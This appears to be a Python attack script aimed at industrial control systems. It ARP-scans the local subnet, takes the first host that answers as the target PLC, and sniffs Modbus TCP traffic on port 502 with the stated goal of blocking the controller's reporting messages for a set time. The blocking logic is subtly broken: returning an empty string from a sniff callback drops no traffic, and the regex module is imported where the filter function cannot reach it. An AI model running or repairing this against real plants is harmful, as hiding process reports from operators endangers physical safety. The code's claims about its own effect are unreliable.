import scapy.all as scapy
import socket
import struct
import time
import subprocess

# Configuration - Adapt these to your environment
INTERFACE = "Ethernet" # Adapt to your Windows machine network interface (e.g., "Wi-Fi", "Ethernet")
# PLC_IP = "192.168.1.100" # Initially set to None, to be discovered dynamically
PLC_IP = None
REPORTING_MESSAGE_PORT = 502 # Common Modbus TCP port, adapt if different for your system
REPORTING_MESSAGE_REGEX = b".*"  #  RegEx to match reporting messages (Example: Any message)
BLOCK_DURATION = 60  # Block for 60 seconds

def get_plc_ip():
    """
    Dynamically discovers the PLC's IP address by sending ARP requests.
    This assumes the workstation communicating with the PLC knows its MAC address.
    This is a simplified approach. More robust methods might be needed for complex networks.
    """
    global PLC_IP

    if PLC_IP:
        print(f"PLC IP already found: {PLC_IP}")
        return PLC_IP

    print("Attempting to discover PLC IP address...")

    # Get gateway IP
    try:
        output = subprocess.check_output("ipconfig", shell=True).decode()
        for line in output.splitlines():
            if "Default Gateway" in line:
                GATEWAY_IP = line.split(":")[-1].strip()
                break
        else:
            GATEWAY_IP = None
            print("Warning: Could not automatically determine default gateway.  ARP scan may be ineffective")
    except Exception as e:
        GATEWAY_IP = None
        print(f"Error getting default gateway: {e}. ARP scan may be ineffective")

    if GATEWAY_IP:
        print(f"Using default gateway: {GATEWAY_IP} for discovery.")
        network_prefix = ".".join(GATEWAY_IP.split(".")[:-1]) + ".0/24"  # Assumes /24 subnet
    else:
        print("No default gateway found. Using 192.168.1.0/24 for discovery.") #Fallback
        network_prefix = "192.168.1.0/24"

    # ARP scan to find PLC IP
    arp_request = scapy.ARP(pdst=network_prefix)
    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC address
    arp_request_packet = ether/arp_request

    answered_list = scapy.srp(arp_request_packet, timeout=3, verbose=False, iface=INTERFACE)[0]

    possible_plcs = []
    for element in answered_list:
        ip_address = element[1].psrc
        mac_address = element[1].hwsrc
        print(f"Found device: IP={ip_address}, MAC={mac_address}") #Debug
        # Add more sophisticated logic here to determine the correct PLC,
        # such as checking the MAC address against a known vendor prefix,
        # or examining open ports via nmap or similar tools
        possible_plcs.append(ip_address)


    if possible_plcs:
        # Simple approach: Use the first IP found.  Requires refinement.
        PLC_IP = possible_plcs[0]
        print(f"Discovered PLC IP: {PLC_IP}")
        return PLC_IP
    else:
        print("Failed to discover PLC IP address.")
        return None

def block_reporting_message(packet):
    """
    Blocks reporting messages matching the specified criteria by dropping them.
    """

    if not PLC_IP:
        print("PLC IP not set. Cannot block reporting messages.")
        return

    ip_layer = packet.getlayer(scapy.IP)
    tcp_layer = packet.getlayer(scapy.TCP)

    if not ip_layer or not tcp_layer:
        return # Not an IP/TCP packet

    if ip_layer.src == PLC_IP and tcp_layer.dport == REPORTING_MESSAGE_PORT:
        #Check Reporting Messages and then apply the function
        if REPORTING_MESSAGE_REGEX is None or re.search(REPORTING_MESSAGE_REGEX, packet.payload):
            print(f"Blocking reporting message from PLC ({PLC_IP}) on port {REPORTING_MESSAGE_PORT}")
            # No need to forward or send anything - just drop the packet
            return "" # Return empty string to drop the packet

    elif ip_layer.dst == PLC_IP and tcp_layer.sport == REPORTING_MESSAGE_PORT:
        #Check Reporting Messages and then apply the function
        if REPORTING_MESSAGE_REGEX is None or re.search(REPORTING_MESSAGE_REGEX, packet.payload):
            print(f"Blocking reporting message to PLC ({PLC_IP}) on port {REPORTING_MESSAGE_PORT}")
            # No need to forward or send anything - just drop the packet
            return "" # Return empty string to drop the packet
    # else:
    #     print(f"Passing through IP src {ip_layer.src} dst {ip_layer.dst}, TCP sport {tcp_layer.sport} dport {tcp_layer.dport} ")
    return packet  # Forward other packets as normal.  Crucial for network functionality.

def main():
    """
    Main function to capture network traffic and block reporting messages.
    """
    global PLC_IP
    import re

    if not PLC_IP:
        PLC_IP = get_plc_ip()

    if not PLC_IP:
        print("Aborting: Could not determine PLC IP address.")
        return

    print(f"Blocking reporting messages to/from PLC: {PLC_IP} on port {REPORTING_MESSAGE_PORT} for {BLOCK_DURATION} seconds.")
    print(f"Using interface: {INTERFACE}")

    try:
        # Use 'prn' to specify a function that processes each packet.  'store=0' prevents saving packets to memory.
        scapy.sniff(iface=INTERFACE, store=0, prn=block_reporting_message, timeout=BLOCK_DURATION)
    except Exception as e:
        print(f"Error during packet sniffing: {e}")

    print("Blocking complete.")

if __name__ == "__main__":
    main()